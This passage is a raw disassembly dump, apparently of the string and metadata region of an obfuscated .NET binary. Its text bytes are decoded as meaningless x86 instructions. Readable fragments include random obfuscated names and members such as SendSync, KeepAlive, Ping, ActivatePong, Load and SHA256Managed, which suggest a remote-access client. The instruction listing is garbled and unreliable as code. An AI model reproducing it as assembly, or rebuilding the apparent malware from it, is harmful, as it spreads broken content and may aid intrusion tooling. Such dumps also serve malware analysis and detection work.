  407fec:	00 63 6d             	add    %ah,0x6d(%ebx)
  407fef:	55                   	push   %ebp
  407ff0:	4e                   	dec    %esi
  407ff1:	71 44                	jno    0x408037
  407ff3:	67 6e                	outsb  %ds:(%si),(%dx)
  407ff5:	65 55                	gs push %ebp
  407ff7:	44                   	inc    %esp
  407ff8:	6a 63                	push   $0x63
  407ffa:	49                   	dec    %ecx
  407ffb:	56                   	push   %esi
  407ffc:	00 47 65             	add    %al,0x65(%edi)
  407fff:	6e                   	outsb  %ds:(%esi),(%dx)
  408000:	65 72 61             	gs jb  0x408064
  408003:	74 65                	je     0x40806a
  408005:	49                   	dec    %ecx
  408006:	56                   	push   %esi
  408007:	00 4a 76             	add    %cl,0x76(%edx)
  40800a:	54                   	push   %esp
  40800b:	4d                   	dec    %ebp
  40800c:	46                   	inc    %esi
  40800d:	69 69 64 61 56 00 78 	imul   $0x78005661,0x64(%ecx),%ebp
  408014:	62 7a 50             	bound  %edi,0x50(%edx)
  408017:	6f                   	outsl  %ds:(%esi),(%dx)
  408018:	69 79 73 69 64 6d 4f 	imul   $0x4f6d6469,0x73(%ecx),%edi
  40801f:	41                   	inc    %ecx
  408020:	62 56 00             	bound  %edx,0x0(%esi)
  408023:	70 7a                	jo     0x40809f
  408025:	78 58                	js     0x40807f
  408027:	4b                   	dec    %ebx
  408028:	54                   	push   %esp
  408029:	5a                   	pop    %edx
  40802a:	4b                   	dec    %ebx
  40802b:	68 6a 77 70 56       	push   $0x5670776a
  408030:	00 50 47             	add    %dl,0x47(%eax)
  408033:	58                   	pop    %eax
  408034:	72 48                	jb     0x40807e
  408036:	42                   	inc    %edx
  408037:	79 6c                	jns    0x4080a5
  408039:	61                   	popa
  40803a:	58                   	pop    %eax
  40803b:	73 56                	jae    0x408093
  40803d:	00 6c 4c 42          	add    %ch,0x42(%esp,%ecx,2)
  408041:	68 77 4f 72 48       	push   $0x48724f77
  408046:	6b 74 56 00 45       	imul   $0x45,0x0(%esi,%edx,2),%esi
  40804b:	65 49                	gs dec %ecx
  40804d:	6d                   	insl   (%dx),%es:(%edi)
  40804e:	74 72                	je     0x4080c2
  408050:	78 4f                	js     0x4080a1
  408052:	76 56                	jbe    0x4080aa
  408054:	00 6c 41 4a          	add    %ch,0x4a(%ecx,%eax,2)
  408058:	4f                   	dec    %edi
  408059:	49                   	dec    %ecx
  40805a:	45                   	inc    %ebp
  40805b:	46                   	inc    %esi
  40805c:	43                   	inc    %ebx
  40805d:	68 78 56 00 66       	push   $0x66005678
  408062:	75 64                	jne    0x4080c8
  408064:	49                   	dec    %ecx
  408065:	4e                   	dec    %esi
  408066:	4c                   	dec    %esp
  408067:	46                   	inc    %esi
  408068:	57                   	push   %edi
  408069:	55                   	push   %ebp
  40806a:	42                   	inc    %edx
  40806b:	57                   	push   %edi
  40806c:	00 51 76             	add    %dl,0x76(%ecx)
  40806f:	45                   	inc    %ebp
  408070:	4b                   	dec    %ebx
  408071:	77 53                	ja     0x4080c6
  408073:	6f                   	outsl  %ds:(%esi),(%dx)
  408074:	61                   	popa
  408075:	76 48                	jbe    0x4080bf
  408077:	50                   	push   %eax
  408078:	57                   	push   %edi
  408079:	00 48 4a             	add    %cl,0x4a(%eax)
  40807c:	59                   	pop    %ecx
  40807d:	55                   	push   %ebp
  40807e:	58                   	pop    %eax
  40807f:	45                   	inc    %ebp
  408080:	55                   	push   %ebp
  408081:	4c                   	dec    %esp
  408082:	67 63 47 52          	arpl   %eax,0x52(%bx)
  408086:	57                   	push   %edi
  408087:	00 4d 66             	add    %cl,0x66(%ebp)
  40808a:	4f                   	dec    %edi
  40808b:	4e                   	dec    %esi
  40808c:	6c                   	insb   (%dx),%es:(%edi)
  40808d:	49                   	dec    %ecx
  40808e:	4b                   	dec    %ebx
  40808f:	66 62 53 57          	bound  %dx,0x57(%ebx)
  408093:	00 65 51             	add    %ah,0x51(%ebp)
  408096:	73 4e                	jae    0x4080e6
  408098:	54                   	push   %esp
  408099:	72 76                	jb     0x408111
  40809b:	61                   	popa
  40809c:	61                   	popa
  40809d:	57                   	push   %edi
  40809e:	00 52 61             	add    %dl,0x61(%edx)
  4080a1:	55                   	push   %ebp
  4080a2:	71 77                	jno    0x40811b
  4080a4:	46                   	inc    %esi
  4080a5:	4f                   	dec    %edi
  4080a6:	67 58                	addr16 pop %eax
  4080a8:	48                   	dec    %eax
  4080a9:	57                   	push   %edi
  4080aa:	4d                   	dec    %ebp
  4080ab:	74 57                	je     0x408104
  4080ad:	00 58 5a             	add    %bl,0x5a(%eax)
  4080b0:	5a                   	pop    %edx
  4080b1:	69 4f 77 79 51 73 75 	imul   $0x75735179,0x77(%edi),%ecx
  4080b8:	57                   	push   %edi
  4080b9:	00 47 65             	add    %al,0x65(%edi)
  4080bc:	47                   	inc    %edi
  4080bd:	74 64                	je     0x408123
  4080bf:	46                   	inc    %esi
  4080c0:	72 66                	jb     0x408128
  4080c2:	62 68 75             	bound  %ebp,0x75(%eax)
  4080c5:	49                   	dec    %ecx
  4080c6:	58                   	pop    %eax
  4080c7:	00 7a 6b             	add    %bh,0x6b(%edx)
  4080ca:	61                   	popa
  4080cb:	59                   	pop    %ecx
  4080cc:	65 64 79 5a          	gs fs jns 0x40812a
  4080d0:	53                   	push   %ebx
  4080d1:	4a                   	dec    %edx
  4080d2:	58                   	pop    %eax
  4080d3:	00 6f 4e             	add    %ch,0x4e(%edi)
  4080d6:	42                   	inc    %edx
  4080d7:	63 79 51             	arpl   %edi,0x51(%ecx)
  4080da:	65 7a 6a             	gs jp  0x408147
  4080dd:	4e                   	dec    %esi
  4080de:	58                   	pop    %eax
  4080df:	00 62 65             	add    %ah,0x65(%edx)
  4080e2:	41                   	inc    %ecx
  4080e3:	50                   	push   %eax
  4080e4:	65 75 57             	gs jne 0x40813e
  4080e7:	54                   	push   %esp
  4080e8:	6c                   	insb   (%dx),%es:(%edi)
  4080e9:	48                   	dec    %eax
  4080ea:	4d                   	dec    %ebp
  4080eb:	75 55                	jne    0x408142
  4080ed:	58                   	pop    %eax
  4080ee:	00 74 4f 47          	add    %dh,0x47(%edi,%ecx,2)
  4080f2:	79 71                	jns    0x408165
  4080f4:	75 61                	jne    0x408157
  4080f6:	47                   	inc    %edi
  4080f7:	75 67                	jne    0x408160
  4080f9:	56                   	push   %esi
  4080fa:	58                   	pop    %eax
  4080fb:	00 63 54             	add    %ah,0x54(%ebx)
  4080fe:	4d                   	dec    %ebp
  4080ff:	42                   	inc    %edx
  408100:	77 50                	ja     0x408152
  408102:	69 45 67 6b 69 58 00 	imul   $0x58696b,0x67(%ebp),%eax
  408109:	71 4d                	jno    0x408158
  40810b:	4e                   	dec    %esi
  40810c:	6d                   	insl   (%dx),%es:(%edi)
  40810d:	4d                   	dec    %ebp
  40810e:	74 43                	je     0x408153
  408110:	73 50                	jae    0x408162
  408112:	59                   	pop    %ecx
  408113:	6a 67                	push   $0x67
  408115:	43                   	inc    %ebx
  408116:	4f                   	dec    %edi
  408117:	4e                   	dec    %esi
  408118:	77 58                	ja     0x408172
  40811a:	00 62 48             	add    %ah,0x48(%edx)
  40811d:	70 45                	jo     0x408164
  40811f:	45                   	inc    %ebp
  408120:	76 64                	jbe    0x408186
  408122:	73 4a                	jae    0x40816e
  408124:	70 79                	jo     0x40819f
  408126:	7a 58                	jp     0x408180
  408128:	00 6e 51             	add    %ch,0x51(%esi)
  40812b:	78 42                	js     0x40816f
  40812d:	44                   	inc    %esp
  40812e:	6d                   	insl   (%dx),%es:(%edi)
  40812f:	74 71                	je     0x4081a2
  408131:	47                   	inc    %edi
  408132:	67 73 50             	addr16 jae 0x408185
  408135:	6b 47 59 00          	imul   $0x0,0x59(%edi),%eax
  408139:	71 76                	jno    0x4081b1
  40813b:	6e                   	outsb  %ds:(%esi),(%dx)
  40813c:	45                   	inc    %ebp
  40813d:	47                   	inc    %edi
  40813e:	54                   	push   %esp
  40813f:	55                   	push   %ebp
  408140:	6b 6a 6f 65          	imul   $0x65,0x6f(%edx),%ebp
  408144:	59                   	pop    %ecx
  408145:	00 6d 4e             	add    %ch,0x4e(%ebp)
  408148:	51                   	push   %ecx
  408149:	75 6a                	jne    0x4081b5
  40814b:	62 68 4d             	bound  %ebp,0x4d(%eax)
  40814e:	4c                   	dec    %esp
  40814f:	6a 59                	push   $0x59
  408151:	00 44 4e 6c          	add    %al,0x6c(%esi,%ecx,2)
  408155:	47                   	inc    %edi
  408156:	6d                   	insl   (%dx),%es:(%edi)
  408157:	41                   	inc    %ecx
  408158:	57                   	push   %edi
  408159:	71 4d                	jno    0x4081a8
  40815b:	44                   	inc    %esp
  40815c:	48                   	dec    %eax
  40815d:	6f                   	outsl  %ds:(%esi),(%dx)
  40815e:	4b                   	dec    %ebx
  40815f:	73 59                	jae    0x4081ba
  408161:	00 41 41             	add    %al,0x41(%ecx)
  408164:	51                   	push   %ecx
  408165:	55                   	push   %ebp
  408166:	72 46                	jb     0x4081ae
  408168:	61                   	popa
  408169:	59                   	pop    %ecx
  40816a:	5a                   	pop    %edx
  40816b:	63 56 4e             	arpl   %edx,0x4e(%esi)
  40816e:	42                   	inc    %edx
  40816f:	5a                   	pop    %edx
  408170:	00 4f 45             	add    %cl,0x45(%edi)
  408173:	44                   	inc    %esp
  408174:	6b 7a 41 78          	imul   $0x78,0x41(%edx),%edi
  408178:	79 58                	jns    0x4081d2
  40817a:	4b                   	dec    %ebx
  40817b:	71 41                	jno    0x4081be
  40817d:	4e                   	dec    %esi
  40817e:	5a                   	pop    %edx
  40817f:	00 4a 42             	add    %cl,0x42(%edx)
  408182:	52                   	push   %edx
  408183:	73 6f                	jae    0x4081f4
  408185:	44                   	inc    %esp
  408186:	68 66 72 4b 6a       	push   $0x6a4b7266
  40818b:	75 55                	jne    0x4081e2
  40818d:	5a                   	pop    %edx
  40818e:	00 6c 6d 45          	add    %ch,0x45(%ebp,%ebp,2)
  408192:	4c                   	dec    %esp
  408193:	77 44                	ja     0x4081d9
  408195:	6b 6f 59 6f          	imul   $0x6f,0x59(%edi),%ebp
  408199:	6d                   	insl   (%dx),%es:(%edi)
  40819a:	71 61                	jno    0x4081fd
  40819c:	5a                   	pop    %edx
  40819d:	00 69 4f             	add    %ch,0x4f(%ecx)
  4081a0:	4f                   	dec    %edi
  4081a1:	61                   	popa
  4081a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4081a3:	50                   	push   %eax
  4081a4:	73 64                	jae    0x40820a
  4081a6:	57                   	push   %edi
  4081a7:	41                   	inc    %ecx
  4081a8:	67 5a                	addr16 pop %edx
  4081aa:	69 63 5a 00 76 61 6c 	imul   $0x6c617600,0x5a(%ebx),%esp
  4081b1:	75 65                	jne    0x408218
  4081b3:	5f                   	pop    %edi
  4081b4:	5f                   	pop    %edi
  4081b5:	00 4a 4a             	add    %cl,0x4a(%edx)
  4081b8:	4f                   	dec    %edi
  4081b9:	5a                   	pop    %edx
  4081ba:	46                   	inc    %esi
  4081bb:	49                   	dec    %ecx
  4081bc:	79 4f                	jns    0x40820d
  4081be:	7a 4c                	jp     0x40820c
  4081c0:	61                   	popa
  4081c1:	00 69 7a             	add    %ch,0x7a(%ecx)
  4081c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c5:	43                   	inc    %ebx
  4081c6:	4a                   	dec    %edx
  4081c7:	6c                   	insb   (%dx),%es:(%edi)
  4081c8:	71 57                	jno    0x408221
  4081ca:	52                   	push   %edx
  4081cb:	48                   	dec    %eax
  4081cc:	66 51                	push   %cx
  4081ce:	61                   	popa
  4081cf:	00 73 76             	add    %dh,0x76(%ebx)
  4081d2:	62 54 54 4d          	bound  %edx,0x4d(%esp,%edx,2)
  4081d6:	72 56                	jb     0x40822e
  4081d8:	59                   	pop    %ecx
  4081d9:	6c                   	insb   (%dx),%es:(%edi)
  4081da:	52                   	push   %edx
  4081db:	61                   	popa
  4081dc:	00 6d 69             	add    %ch,0x69(%ebp)
  4081df:	58                   	pop    %eax
  4081e0:	71 65                	jno    0x408247
  4081e2:	53                   	push   %ebx
  4081e3:	4a                   	dec    %edx
  4081e4:	4f                   	dec    %edi
  4081e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4081e6:	71 64                	jno    0x40824c
  4081e8:	61                   	popa
  4081e9:	00 54 6c 58          	add    %dl,0x58(%esp,%ebp,2)
  4081ed:	54                   	push   %esp
  4081ee:	43                   	inc    %ebx
  4081ef:	4a                   	dec    %edx
  4081f0:	66 45                	inc    %bp
  4081f2:	47                   	inc    %edi
  4081f3:	4e                   	dec    %esi
  4081f4:	53                   	push   %ebx
  4081f5:	65 69 61 00 65 43 44 	imul   $0x52444365,%gs:0x0(%ecx),%esp
  4081fc:	52 
  4081fd:	6d                   	insl   (%dx),%es:(%edi)
  4081fe:	44                   	inc    %esp
  4081ff:	76 4e                	jbe    0x40824f
  408201:	77 41                	ja     0x408244
  408203:	6b 61 00 76          	imul   $0x76,0x0(%ecx),%esp
  408207:	49                   	dec    %ecx
  408208:	6f                   	outsl  %ds:(%esi),(%dx)
  408209:	56                   	push   %esi
  40820a:	6b 7a 4b 59          	imul   $0x59,0x4b(%edx),%edi
  40820e:	52                   	push   %edx
  40820f:	74 74                	je     0x408285
  408211:	4c                   	dec    %esp
  408212:	6b 61 00 79          	imul   $0x79,0x0(%ecx),%esp
  408216:	61                   	popa
  408217:	71 50                	jno    0x408269
  408219:	50                   	push   %eax
  40821a:	4f                   	dec    %edi
  40821b:	49                   	dec    %ecx
  40821c:	73 77                	jae    0x408295
  40821e:	51                   	push   %ecx
  40821f:	54                   	push   %esp
  408220:	5a                   	pop    %edx
  408221:	74 61                	je     0x408284
  408223:	00 4c 68 77          	add    %cl,0x77(%eax,%ebp,2)
  408227:	52                   	push   %edx
  408228:	6d                   	insl   (%dx),%es:(%edi)
  408229:	58                   	pop    %eax
  40822a:	42                   	inc    %edx
  40822b:	72 6d                	jb     0x40829a
  40822d:	72 78                	jb     0x4082a7
  40822f:	61                   	popa
  408230:	00 79 46             	add    %bh,0x46(%ecx)
  408233:	59                   	pop    %ecx
  408234:	52                   	push   %edx
  408235:	62 55 6b             	bound  %edx,0x6b(%ebp)
  408238:	69 79 61 00 6b 6d 53 	imul   $0x536d6b00,0x61(%ecx),%edi
  40823f:	69 4a 6b 7a 4a 4a 62 	imul   $0x624a4a7a,0x6b(%edx),%ecx
  408246:	00 53 58             	add    %dl,0x58(%ebx)
  408249:	50                   	push   %eax
  40824a:	66 45                	inc    %bp
  40824c:	70 6d                	jo     0x4082bb
  40824e:	67 50                	addr16 push %eax
  408250:	62 00                	bound  %eax,(%eax)
  408252:	6d                   	insl   (%dx),%es:(%edi)
  408253:	73 63                	jae    0x4082b8
  408255:	6f                   	outsl  %ds:(%esi),(%dx)
  408256:	72 6c                	jb     0x4082c4
  408258:	69 62 00 4e 52 63 64 	imul   $0x6463524e,0x0(%edx),%esp
  40825f:	5a                   	pop    %edx
  408260:	70 4b                	jo     0x4082ad
  408262:	4f                   	dec    %edi
  408263:	79 6b                	jns    0x4082d0
  408265:	62 00                	bound  %eax,(%eax)
  408267:	5a                   	pop    %edx
  408268:	66 6d                	insw   (%dx),%es:(%edi)
  40826a:	70 78                	jo     0x4082e4
  40826c:	53                   	push   %ebx
  40826d:	48                   	dec    %eax
  40826e:	4d                   	dec    %ebp
  40826f:	77 6f                	ja     0x4082e0
  408271:	62 00                	bound  %eax,(%eax)
  408273:	6a 53                	push   $0x53
  408275:	75 4d                	jne    0x4082c4
  408277:	59                   	pop    %ecx
  408278:	63 7a 51             	arpl   %edi,0x51(%edx)
  40827b:	43                   	inc    %ebx
  40827c:	74 58                	je     0x4082d6
  40827e:	70 62                	jo     0x4082e2
  408280:	00 42 6c             	add    %al,0x6c(%edx)
  408283:	42                   	inc    %edx
  408284:	49                   	dec    %ecx
  408285:	4f                   	dec    %edi
  408286:	53                   	push   %ebx
  408287:	52                   	push   %edx
  408288:	6d                   	insl   (%dx),%es:(%edi)
  408289:	4c                   	dec    %esp
  40828a:	6a 71                	push   $0x71
  40828c:	65 72 62             	gs jb  0x4082f1
  40828f:	00 78 61             	add    %bh,0x61(%eax)
  408292:	4d                   	dec    %ebp
  408293:	71 49                	jno    0x4082de
  408295:	72 4d                	jb     0x4082e4
  408297:	75 53                	jne    0x4082ec
  408299:	77 59                	ja     0x4082f4
  40829b:	4c                   	dec    %esp
  40829c:	42                   	inc    %edx
  40829d:	78 62                	js     0x408301
  40829f:	00 46 74             	add    %al,0x74(%esi)
  4082a2:	4e                   	dec    %esi
  4082a3:	58                   	pop    %eax
  4082a4:	44                   	inc    %esp
  4082a5:	47                   	inc    %edi
  4082a6:	70 4f                	jo     0x4082f7
  4082a8:	5a                   	pop    %edx
  4082a9:	64 41                	fs inc %ecx
  4082ab:	68 4a 63 00 57       	push   $0x5700634a
  4082b0:	49                   	dec    %ecx
  4082b1:	48                   	dec    %eax
  4082b2:	51                   	push   %ecx
  4082b3:	54                   	push   %esp
  4082b4:	4b                   	dec    %ebx
  4082b5:	79 48                	jns    0x4082ff
  4082b7:	4f                   	dec    %edi
  4082b8:	47                   	inc    %edi
  4082b9:	71 67                	jno    0x408322
  4082bb:	4c                   	dec    %esp
  4082bc:	63 00                	arpl   %eax,(%eax)
  4082be:	43                   	inc    %ebx
  4082bf:	78 41                	js     0x408302
  4082c1:	56                   	push   %esi
  4082c2:	42                   	inc    %edx
  4082c3:	58                   	pop    %eax
  4082c4:	4f                   	dec    %edi
  4082c5:	75 76                	jne    0x40833d
  4082c7:	62 49 48             	bound  %ecx,0x48(%ecx)
  4082ca:	67 64 52             	addr16 fs push %edx
  4082cd:	63 00                	arpl   %eax,(%eax)
  4082cf:	63 6e 53             	arpl   %ebp,0x53(%esi)
  4082d2:	54                   	push   %esp
  4082d3:	76 49                	jbe    0x40831e
  4082d5:	4a                   	dec    %edx
  4082d6:	66 53                	push   %bx
  4082d8:	55                   	push   %ebp
  4082d9:	62 45 7a             	bound  %eax,0x7a(%ebp)
  4082dc:	75 68                	jne    0x408346
  4082de:	57                   	push   %edi
  4082df:	63 00                	arpl   %eax,(%eax)
  4082e1:	59                   	pop    %ecx
  4082e2:	4f                   	dec    %edi
  4082e3:	48                   	dec    %eax
  4082e4:	65 52                	gs push %edx
  4082e6:	59                   	pop    %ecx
  4082e7:	43                   	inc    %ebx
  4082e8:	77 64                	ja     0x40834e
  4082ea:	63 00                	arpl   %eax,(%eax)
  4082ec:	46                   	inc    %esi
  4082ed:	48                   	dec    %eax
  4082ee:	41                   	inc    %ecx
  4082ef:	4c                   	dec    %esp
  4082f0:	70 53                	jo     0x408345
  4082f2:	4d                   	dec    %ebp
  4082f3:	52                   	push   %edx
  4082f4:	77 4a                	ja     0x408340
  4082f6:	6c                   	insb   (%dx),%es:(%edi)
  4082f7:	65 6a 6c             	gs push $0x6c
  4082fa:	74 65                	je     0x408361
  4082fc:	63 00                	arpl   %eax,(%eax)
  4082fe:	53                   	push   %ebx
  4082ff:	79 73                	jns    0x408374
  408301:	74 65                	je     0x408368
  408303:	6d                   	insl   (%dx),%es:(%edi)
  408304:	2e 43                	cs inc %ebx
  408306:	6f                   	outsl  %ds:(%esi),(%dx)
  408307:	6c                   	insb   (%dx),%es:(%edi)
  408308:	6c                   	insb   (%dx),%es:(%edi)
  408309:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40830e:	6e                   	outsb  %ds:(%esi),(%dx)
  40830f:	73 2e                	jae    0x40833f
  408311:	47                   	inc    %edi
  408312:	65 6e                	outsb  %gs:(%esi),(%dx)
  408314:	65 72 69             	gs jb  0x408380
  408317:	63 00                	arpl   %eax,(%eax)
  408319:	4d                   	dec    %ebp
  40831a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408321:	74 2e                	je     0x408351
  408323:	56                   	push   %esi
  408324:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  40832b:	73 69                	jae    0x408396
  40832d:	63 00                	arpl   %eax,(%eax)
  40832f:	67 65 74 5f          	addr16 gs je 0x408392
  408333:	53                   	push   %ebx
  408334:	65 6e                	outsb  %gs:(%esi),(%dx)
  408336:	64 53                	fs push %ebx
  408338:	79 6e                	jns    0x4083a8
  40833a:	63 00                	arpl   %eax,(%eax)
  40833c:	6e                   	outsb  %ds:(%esi),(%dx)
  40833d:	57                   	push   %edi
  40833e:	4a                   	dec    %edx
  40833f:	4c                   	dec    %esp
  408340:	43                   	inc    %ebx
  408341:	53                   	push   %ebx
  408342:	4c                   	dec    %esp
  408343:	6d                   	insl   (%dx),%es:(%edi)
  408344:	66 59                	pop    %cx
  408346:	6f                   	outsl  %ds:(%esi),(%dx)
  408347:	63 00                	arpl   %eax,(%eax)
  408349:	46                   	inc    %esi
  40834a:	49                   	dec    %ecx
  40834b:	68 73 48 53 45       	push   $0x45534873
  408350:	57                   	push   %edi
  408351:	56                   	push   %esi
  408352:	45                   	inc    %ebp
  408353:	76 49                	jbe    0x40839e
  408355:	70 63                	jo     0x4083ba
  408357:	00 72 63             	add    %dh,0x63(%edx)
  40835a:	61                   	popa
  40835b:	4e                   	dec    %esi
  40835c:	44                   	inc    %esp
  40835d:	5a                   	pop    %edx
  40835e:	43                   	inc    %ebx
  40835f:	4c                   	dec    %esp
  408360:	75 42                	jne    0x4083a4
  408362:	4d                   	dec    %ebp
  408363:	42                   	inc    %edx
  408364:	73 63                	jae    0x4083c9
  408366:	00 70 68             	add    %dh,0x68(%eax)
  408369:	6d                   	insl   (%dx),%es:(%edi)
  40836a:	66 62 54 48 41       	bound  %dx,0x41(%eax,%ecx,2)
  40836f:	6f                   	outsl  %ds:(%esi),(%dx)
  408370:	70 7a                	jo     0x4083ec
  408372:	67 41                	addr16 inc %ecx
  408374:	64 00 78 4e          	add    %bh,%fs:0x4e(%eax)
  408378:	50                   	push   %eax
  408379:	76 68                	jbe    0x4083e3
  40837b:	56                   	push   %esi
  40837c:	55                   	push   %ebp
  40837d:	66 53                	push   %bx
  40837f:	42                   	inc    %edx
  408380:	74 6a                	je     0x4083ec
  408382:	46                   	inc    %esi
  408383:	64 00 6a 53          	add    %ch,%fs:0x53(%edx)
  408387:	64 4a                	fs dec %edx
  408389:	44                   	inc    %esp
  40838a:	55                   	push   %ebp
  40838b:	6f                   	outsl  %ds:(%esi),(%dx)
  40838c:	46                   	inc    %esi
  40838d:	43                   	inc    %ebx
  40838e:	56                   	push   %esi
  40838f:	4b                   	dec    %ebx
  408390:	64 00 6f 62          	add    %ch,%fs:0x62(%edi)
  408394:	4f                   	dec    %edi
  408395:	53                   	push   %ebx
  408396:	74 4b                	je     0x4083e3
  408398:	69 79 51 52 46 50 64 	imul   $0x64504652,0x51(%ecx),%edi
  40839f:	00 45 6e             	add    %al,0x6e(%ebp)
  4083a2:	64 52                	fs push %edx
  4083a4:	65 61                	gs popa
  4083a6:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  4083aa:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  4083b1:	00 
  4083b2:	54                   	push   %esp
  4083b3:	68 72 65 61 64       	push   $0x64616572
  4083b8:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  4083bc:	64 00 41 7a          	add    %al,%fs:0x7a(%ecx)
  4083c0:	52                   	push   %edx
  4083c1:	41                   	inc    %ecx
  4083c2:	67 4c                	addr16 dec %esp
  4083c4:	6a 50                	push   $0x50
  4083c6:	43                   	inc    %ebx
  4083c7:	70 52                	jo     0x40841b
  4083c9:	4a                   	dec    %edx
  4083ca:	62 64 00 41          	bound  %esp,0x41(%eax,%eax,1)
  4083ce:	64 64 00 64 73 57    	fs add %ah,%fs:0x57(%ebx,%esi,2)
  4083d4:	79 4e                	jns    0x408424
  4083d6:	4d                   	dec    %ebp
  4083d7:	56                   	push   %esi
  4083d8:	57                   	push   %edi
  4083d9:	70 6e                	jo     0x408449
  4083db:	62 6a 64             	bound  %ebp,0x64(%edx)
  4083de:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  4083e3:	41                   	inc    %ecx
  4083e4:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  4083ea:	61                   	popa
  4083eb:	67 65 64 00 67 53    	gs add %ah,%fs:0x53(%bx)
  4083f1:	44                   	inc    %esp
  4083f2:	50                   	push   %eax
  4083f3:	4b                   	dec    %ebx
  4083f4:	54                   	push   %esp
  4083f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4083f6:	53                   	push   %ebx
  4083f7:	48                   	dec    %eax
  4083f8:	74 65                	je     0x40845f
  4083fa:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  4083fe:	74 5f                	je     0x40845f
  408400:	43                   	inc    %ebx
  408401:	6f                   	outsl  %ds:(%esi),(%dx)
  408402:	6e                   	outsb  %ds:(%esi),(%dx)
  408403:	6e                   	outsb  %ds:(%esi),(%dx)
  408404:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408409:	00 67 65             	add    %ah,0x65(%edi)
  40840c:	74 5f                	je     0x40846d
  40840e:	49                   	dec    %ecx
  40840f:	73 43                	jae    0x408454
  408411:	6f                   	outsl  %ds:(%esi),(%dx)
  408412:	6e                   	outsb  %ds:(%esi),(%dx)
  408413:	6e                   	outsb  %ds:(%esi),(%dx)
  408414:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408419:	00 73 65             	add    %dh,0x65(%ebx)
  40841c:	74 5f                	je     0x40847d
  40841e:	49                   	dec    %ecx
  40841f:	73 43                	jae    0x408464
  408421:	6f                   	outsl  %ds:(%esi),(%dx)
  408422:	6e                   	outsb  %ds:(%esi),(%dx)
  408423:	6e                   	outsb  %ds:(%esi),(%dx)
  408424:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408429:	00 67 65             	add    %ah,0x65(%edi)
  40842c:	74 5f                	je     0x40848d
  40842e:	47                   	inc    %edi
  40842f:	75 69                	jne    0x40849a
  408431:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  408435:	65 6e                	outsb  %gs:(%esi),(%dx)
  408437:	64 53                	fs push %ebx
  408439:	79 6e                	jns    0x4084a9
  40843b:	63 3e                	arpl   %edi,(%esi)
  40843d:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408441:	61                   	popa
  408442:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408445:	6e                   	outsb  %ds:(%esi),(%dx)
  408446:	67 46                	addr16 inc %esi
  408448:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  40844f:	73 43                	jae    0x408494
  408451:	6f                   	outsl  %ds:(%esi),(%dx)
  408452:	6e                   	outsb  %ds:(%esi),(%dx)
  408453:	6e                   	outsb  %ds:(%esi),(%dx)
  408454:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408459:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  40845e:	61                   	popa
  40845f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408462:	6e                   	outsb  %ds:(%esi),(%dx)
  408463:	67 46                	addr16 inc %esi
  408465:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  40846c:	65 65 70 41          	gs gs jo 0x4084b1
  408470:	6c                   	insb   (%dx),%es:(%edi)
  408471:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  408478:	42                   	inc    %edx
  408479:	61                   	popa
  40847a:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40847d:	6e                   	outsb  %ds:(%esi),(%dx)
  40847e:	67 46                	addr16 inc %esi
  408480:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  408487:	65 61                	gs popa
  408489:	64 65 72 53          	fs gs jb 0x4084e0
  40848d:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  408494:	42                   	inc    %edx
  408495:	61                   	popa
  408496:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408499:	6e                   	outsb  %ds:(%esi),(%dx)
  40849a:	67 46                	addr16 inc %esi
  40849c:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  4084a3:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  4084aa:	42                   	inc    %edx
  4084ab:	61                   	popa
  4084ac:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084af:	6e                   	outsb  %ds:(%esi),(%dx)
  4084b0:	67 46                	addr16 inc %esi
  4084b2:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  4084b9:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4084bd:	61                   	popa
  4084be:	74 65                	je     0x408525
  4084c0:	50                   	push   %eax
  4084c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4084c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4084c3:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  4084c9:	61                   	popa
  4084ca:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ce:	67 46                	addr16 inc %esi
  4084d0:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4084d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4084d8:	74 65                	je     0x40853f
  4084da:	72 76                	jb     0x408552
  4084dc:	61                   	popa
  4084dd:	6c                   	insb   (%dx),%es:(%edi)
